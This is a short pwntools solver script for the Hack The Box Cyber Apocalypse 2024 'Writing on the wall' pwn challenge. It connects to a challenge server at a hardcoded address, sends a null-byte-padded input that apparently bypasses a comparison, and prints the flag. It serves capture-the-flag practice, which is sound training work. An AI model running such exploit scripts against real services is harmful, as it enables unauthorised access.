#https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/%5BVery%20Easy%5D%20Writing%20on%20the%20wall

from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process('./writing_on_the_wall')
else:
  IP   = '83.136.254.223'
  PORT = 35233
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

r.sendline(b'\x00' + b'A'* 5 + b'\x00')
r.recvuntil(': ')
print(f'Flag --> {r.recvline().strip().decode()}\n')